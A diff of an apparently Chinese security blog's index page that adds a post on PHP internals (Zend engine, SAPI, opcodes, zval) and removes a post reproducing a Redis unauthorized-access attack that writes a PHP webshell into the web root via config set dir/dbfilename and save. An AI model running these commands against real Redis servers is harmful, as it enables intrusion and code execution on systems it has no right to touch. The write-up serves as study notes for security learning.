@@ -155,6 +155,103 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-phpbottom" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/10/phpbottom/">PHP底层的运行机制与原理</a>
+    </h1>
+  
+
+        
+        <a href="/2019/05/10/phpbottom/" class="archive-article-date">
+  	<time datetime="2019-05-10T06:58:51.471Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近写PHP代码比较多，也算不上什么精通，感觉要使用php就得知道这门语言的底层原理，这里决定了解一下PHP底层的工作原理。</p>
+<h2 id="0x02-什么是PHP"><a href="#0x02-什么是PHP" class="headerlink" title="0x02 什么是PHP"></a>0x02 什么是PHP</h2><p>PHP是一种适用于Web开发的动态语言，是一个用C语言实现，包含大量组件的软件框架。狭义方面来说，可以说是个UI框架(用户界面,也可以说是UI模版<a href="https://www.eefocus.com/yitianzhaohai1/blog/17-03/409354_eaccc.html" target="_blank" rel="noopener">(UI定义)</a>)</p>
+<h2 id="0x03-PHP设计理念与特点"><a href="#0x03-PHP设计理念与特点" class="headerlink" title="0x03 PHP设计理念与特点"></a>0x03 PHP设计理念与特点</h2><ul>
+<li>多进程模型：由于PHP是多进程模型，不同请求间互不干涉，这样保证了一个请求挂掉不会对全盘服务造成影响，当然，随着时代发展，PHP也早已支持多线程模型。</li>
+<li>弱类型语言：和C/C++、Java、C#等语言不同，PHP是一门弱类型语言。一个变量的类型并不是一开始就确定不变，运行中才会确定并可能发生隐式或显式的类型转换，这种机制的灵活性在web开发中非常方便、高效.</li>
+<li>引擎(Zend)+组件(ext)的模式降低内部耦合。</li>
+<li>中间层(sapi)隔绝web server和PHP。</li>
+<li>语法简单灵活，没有太多规范。</li>
+</ul>
+<h2 id="0x04-PHP核心架构"><a href="#0x04-PHP核心架构" class="headerlink" title="0x04 PHP核心架构"></a>0x04 PHP核心架构</h2><p>php四层体系如下：<br><img src="https://s2.ax1x.com/2019/05/10/ERQZlD.jpg" alt="image"></p>
+<p>从下到上的四层体系:</p>
+<ul>
+<li>Zend引擎：Zend整体用C语言实现，是PHP的内核部分。它将PHP代码翻译，实现了基本的数据结构，内存分配机制及管理，提供了相应的api供外部调用，是一切的核心。</li>
+<li>Extensions：围绕Zend引擎，extensions通过组件式的方式提供各种基础服务，我们常见的各种内置函数、标准库等都是通过 extension来实现，用户也可以根据需要实现自己的extension。</li>
+<li>Sapi：Aerver Application Programming Interface，即服务端应用编程接口，是PHP和web server的中间层。Sapi通过钩子函数，使PHP能和外部交互数据，这也将PHP和上层应用解耦。</li>
+<li>上层应用：就是我们平时编写的PHP程序，通过不同的sapi方式得到各种各样的应用模式</li>
+</ul>
+<p>这里有个很好的通俗比喻:如果PHP是一辆车，那么车的框架就是PHP本身，Zend是车的引擎（发动机），Extensions下面的各种组件就是车的轮子，Sapi可以看做是公路，车可以跑在不同类型的公路上，而一次PHP程序的执行就是汽车跑在公路上。因此，我们需要：性能优异的引擎+合适的车轮+正确的跑道。</p>
+<h2 id="0x05-Sapi"><a href="#0x05-Sapi" class="headerlink" title="0x05 Sapi"></a>0x05 Sapi</h2><p>常见的Sapi有：</p>
+<ul>
+<li>apache2handler：以apache作为webserver，采用mod_PHP模式运行时候的处理方式，也是现在应用最广泛的一种。</li>
+<li>fast-cgi：这是webserver和PHP直接的另一种交互方式，也就是大名鼎鼎的fastcgi协议，在最近fastcgi+PHP得到越来越多的应用，也是异步webserver所唯一支持的方式。nginx就是通过php-fpm(fast-cgi)来解析php的。</li>
+<li>cli：命令行调用的应用模式</li>
+</ul>
+<h2 id="0x06-PHP执行流程"><a href="#0x06-PHP执行流程" class="headerlink" title="0x06 PHP执行流程"></a>0x06 PHP执行流程</h2><p><img src="https://s2.ax1x.com/2019/05/10/ERGBSP.jpg" alt="image"></p>
+<p>拿到一段代码后，经过词法解析、语法解析等阶段后，源程序会被翻译成一个个指令（opcodes）,然后ZEND虚拟机顺次执行这些指令完成操作。PHP本身是用C实现的，因此最终调用的也是C的函数，实际上，我们可以把PHP看做一个C开发的软件。</p>
+<p>PHP的执行的核心是翻译出来的一条一条指令，也即opcode。</p>
+<p>Opcode是PHP程序执行的最基本单位。一个opcode由两个参数(op1,op2)、返回值和处理函数组成。PHP程序最终被翻译为一组opcode处理函数的顺序执行。</p>
+<h2 id="0x07-PHP变量"><a href="#0x07-PHP变量" class="headerlink" title="0x07 PHP变量"></a>0x07 PHP变量</h2><p>PHP是一门弱类型语言，本身不严格区分变量的类型。PHP变量可以分为简单类型(int、string、boolean)、集合类型(array、resource、object)和常量(const)。所有变量在底层都是同一种结构zval。</p>
+<p>zval主要由三部分组成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type：指定变量的类型</span><br><span class="line">refcount&amp;is_ref：用来实现引用计数</span><br><span class="line">value：存储变量的实际数据(核心)。因为要存储多种类型，所以zvalue是一个union，也由此实现了弱类型。</span><br></pre></td></tr></table></figure>
+<h2 id="0x08-相关文章"><a href="#0x08-相关文章" class="headerlink" title="0x08 相关文章"></a>0x08 相关文章</h2><p><a href="https://sphenginx.github.io/2016/07/11/php-theory/" target="_blank" rel="noopener">https://sphenginx.github.io/2016/07/11/php-theory/</a></p>
+<p><a href="https://seminelee.github.io/2017/11/19/php/" target="_blank" rel="noopener">https://seminelee.github.io/2017/11/19/php/</a></p>
+<p><a href="http://www.nowamagic.net/librarys/veda/detail/102" target="_blank" rel="noopener">http://www.nowamagic.net/librarys/veda/detail/102</a></p>
+<p>具体内容可以参考上面几篇文章</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/05/10/phpbottom/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-mac pro" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -969,83 +1066,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/03/30/风筝writewp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-redis" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/25/redis/">redis 未授权访问漏洞 getshell</a>
-    </h1>
-  
-
-        
-        <a href="/2019/03/25/redis/" class="archive-article-date">
-  	<time datetime="2019-03-25T05:32:39.745Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="redis-未授权访问漏洞-getshell"><a href="#redis-未授权访问漏洞-getshell" class="headerlink" title="redis 未授权访问漏洞 getshell"></a>redis 未授权访问漏洞 getshell</h2><p>这里记录一下redis未授权访问漏洞的getshell，方便日后回顾</p>
-<p>redis是一个key-value型数据库，信息以键对应值的关系存储在内存中。6379是redis的默认端口。</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载redis，修改redis配置文件redis.conf中的几个地方</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库,也可以改成 bind 0.0.0.0</span><br><span class="line">2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句</span><br></pre></td></tr></table></figure>
-<p>启动redis服务器(当前redis的文件夹)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure></p>
-<p>攻击者:(可以自己虚拟机搭建)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h xxx目标ip -p 6379</span><br></pre></td></tr></table></figure></p>
-<p>或者不用redis，可用telnet等连接命令</p>
-<p>redis配置的几个关键：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir 指定的是redis的“工作路径”，之后生成的RDB和AOF文件都会存储在这里。</span><br><span class="line">dbfilename RDB文件名，默认为“dump.rdb”</span><br><span class="line">appendonly 是否开启AOF</span><br><span class="line">appendfilename AOF文件名，默认为“appendonly.aof”</span><br><span class="line">appendfsync AOF备份方式：always、everysec、no</span><br></pre></td></tr></table></figure>
-<h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p>条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis服务器上有web服务器</span><br><span class="line">（2）web根目录已知</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/   //目标的网站根目录</span><br><span class="line">config set dbfilename shell.php     //修改备份RDB文件名为shell.php</span><br><span class="line">set aaa &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<p>任意set一个变量aaa的值为”&lt;?php phpinfo(); ?&gt;”,即可对目标服务器getshell</p>
-<p>参考链接：<br>离别歌 <a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a></p>
-<p>知乎<br><a href="https://zhuanlan.zhihu.com/p/36529010" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/36529010</a> </p>
-<p>csdn<br><a href="https://blog.csdn.net/u011721501/article/details/45157399" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/45157399</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/25/redis/">展开全文 >></a>
         </p>
       
 
